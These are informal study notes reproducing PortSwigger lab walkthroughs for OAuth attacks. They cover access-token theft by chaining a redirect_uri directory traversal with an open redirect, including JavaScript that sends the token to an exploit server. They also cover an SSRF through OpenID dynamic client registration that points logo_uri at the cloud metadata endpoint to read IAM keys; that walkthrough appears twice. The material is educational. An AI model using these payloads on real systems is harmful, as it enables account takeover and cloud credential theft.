will expand this, but we abuse CSRF and open redirect heavily.  


below is an interesting writeup from portswigger, will add more, maybe. 
```
While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
Study the resulting requests and responses. Notice that the blog website makes an API call to the userinfo endpoint at /me and then uses the data it fetches to log the user in. Send the GET /me request to Burp Repeater.
Log out of your account and log back in again. From the proxy history, find the most recent GET /auth?client_id=[...] request and send it to Repeater.
In Repeater, experiment with the GET /auth?client_id=[...] request. Observe that you cannot supply an external domain as redirect_uri because it's being validated against a whitelist. However, you can append additional characters to the default value without encountering an error, including the /../ directory traversal sequence.
Log out of your account on the blog website and turn on proxy interception in Burp.
In your browser, log in again and go to the intercepted GET /auth?client_id=[...] request in Burp Proxy.
Confirm that the redirect_uri parameter is in fact vulnerable to directory traversal by changing it to:

https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1
Forward any remaining requests and observe that you are eventually redirected to the first blog post. In your browser, notice that your access token is included in the URL as a fragment.

With the help of Burp, audit the other pages on the blog website. Identify the "Next post" option at the bottom of each blog post, which works by redirecting users to the path specified in a query parameter. Send the corresponding GET /post/next?path=[...] request to Repeater.
In Repeater, experiment with the path parameter. Notice that this is an open redirect. You can even supply an absolute URL to elicit a redirect to a completely different domain, for example, your exploit server.
Craft a malicious URL that combines these vulnerabilities. You need a URL that will initiate an OAuth flow with the redirect_uri pointing to the open redirect, which subsequently forwards the victim to your exploit server:

https://YOUR-LAB-OAUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email
Test that this URL works correctly by visiting it in your browser. You should be redirected to the exploit server's "Hello, world!" page, along with the access token in a URL fragment.
On the exploit server, create a suitable script at /exploit that will extract the fragment and output it somewhere. For example, the following script will leak it via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead:

<script>
window.location = '/?'+document.location.hash.substr(1)
</script>
To test that everything is working correctly, store this exploit and visit your malicious URL again in your browser. Then, go to the exploit server access log. There should be a request for GET /?access_token=[...].
You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. For example:

<script>
    if (!document.location.hash) {
        window.location = 'https://YOUR-LAB-AUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
To test that the exploit works, store it and then click "View exploit". The page should appear to refresh, but if you check the access log, you should see a new request for GET /?access_token=[...].
Deliver the exploit to the victim, then copy their access token from the log.
In Repeater, go to the GET /me request and replace the token in the Authorization: Bearer header with the one you just copied. Send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.
Use the "Submit solution" button at the top of the lab page to submit the stolen key and solve the lab.
```
can check configurations. 
```
While proxying traffic through Burp, log in to your own account. Browse to https://YOUR-LAB-OAUTH-SERVER.web-security-academy.net/.well-known/openid-configuration to access the configuration file. Notice that the client registration endpoint is located at /reg.
In Burp Repeater, create a suitable POST request to register your own client application with the OAuth service. You must at least provide a redirect_uris array containing an arbitrary whitelist of callback URIs for your fake application. For example:

POST /reg HTTP/1.1
Host: YOUR-LAB-OAUTH-SERVER.web-security-academy.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ]
}
Send the request. Observe that you have now successfully registered your own client application without requiring any authentication. The response contains various metadata associated with your new client application, including a new client_id.
Using Burp, audit the OAuth flow and notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo. This is fetched from /client/CLIENT-ID/logo. We know from the OpenID specification that client applications can provide the URL for their logo using the logo_uri property during dynamic registration. Send the GET /client/CLIENT-ID/logo request to Burp Repeater.
From the "Burp" menu, open the Burp Collaborator client and click "Copy to clipboard" to copy your Collaborator URL. Leave the Collaborator dialog open for now.
In Repeater, go back to the POST /reg request that you created earlier. Add the logo_uri property and paste your Collaborator URL as its value. The final request should look something like this:

POST /reg HTTP/1.1
Host: YOUR-LAB-OAUTH-SERVER.web-security-academy.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri" : "https://YOUR-COLLABORATOR-ID.burpcollaborator.net"
}
Send the request to register a new client application and copy the client_id from the response.
In Repeater, go to the GET /client/CLIENT-ID/logo request. Replace the CLIENT-ID in the path with the new one you just copied and send the request.
Go to the Burp Collaborator client dialog and check for any new interactions. Notice that there is an HTTP interaction attempting to fetch your non-existent logo. This confirms that you can successfully use the logo_uri property to elicit requests from the OAuth server.
Go back to the POST /reg request in Repeater and replace the current logo_uri value with the target URL:

"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
Send this request and copy the new client_id from the response.
Go back to the GET /client/CLIENT-ID/logo request and replace the client_id with the new one you just copied. Send this request. Observe that the response contains the sensitive metadata for the OAuth provider's cloud environment, including the secret access key.
Use the "Submit solution" button to submit the access key and solve the lab.
```
the ssrf attack:  
https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration. 
```
While proxying traffic through Burp, log in to your own account. Browse to https://YOUR-LAB-OAUTH-SERVER.web-security-academy.net/.well-known/openid-configuration to access the configuration file. Notice that the client registration endpoint is located at /reg.
In Burp Repeater, create a suitable POST request to register your own client application with the OAuth service. You must at least provide a redirect_uris array containing an arbitrary whitelist of callback URIs for your fake application. For example:

POST /reg HTTP/1.1
Host: YOUR-LAB-OAUTH-SERVER.web-security-academy.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ]
}
Send the request. Observe that you have now successfully registered your own client application without requiring any authentication. The response contains various metadata associated with your new client application, including a new client_id.
Using Burp, audit the OAuth flow and notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo. This is fetched from /client/CLIENT-ID/logo. We know from the OpenID specification that client applications can provide the URL for their logo using the logo_uri property during dynamic registration. Send the GET /client/CLIENT-ID/logo request to Burp Repeater.
From the "Burp" menu, open the Burp Collaborator client and click "Copy to clipboard" to copy your Collaborator URL. Leave the Collaborator dialog open for now.
In Repeater, go back to the POST /reg request that you created earlier. Add the logo_uri property and paste your Collaborator URL as its value. The final request should look something like this:

POST /reg HTTP/1.1
Host: YOUR-LAB-OAUTH-SERVER.web-security-academy.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri" : "https://YOUR-COLLABORATOR-ID.burpcollaborator.net"
}
Send the request to register a new client application and copy the client_id from the response.
In Repeater, go to the GET /client/CLIENT-ID/logo request. Replace the CLIENT-ID in the path with the new one you just copied and send the request.
Go to the Burp Collaborator client dialog and check for any new interactions. Notice that there is an HTTP interaction attempting to fetch your non-existent logo. This confirms that you can successfully use the logo_uri property to elicit requests from the OAuth server.
Go back to the POST /reg request in Repeater and replace the current logo_uri value with the target URL:

"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
Send this request and copy the new client_id from the response.
Go back to the GET /client/CLIENT-ID/logo request and replace the client_id with the new one you just copied. Send this request. Observe that the response contains the sensitive metadata for the OAuth provider's cloud environment, including the secret access key.
Use the "Submit solution" button to submit the access key and solve the lab.
```
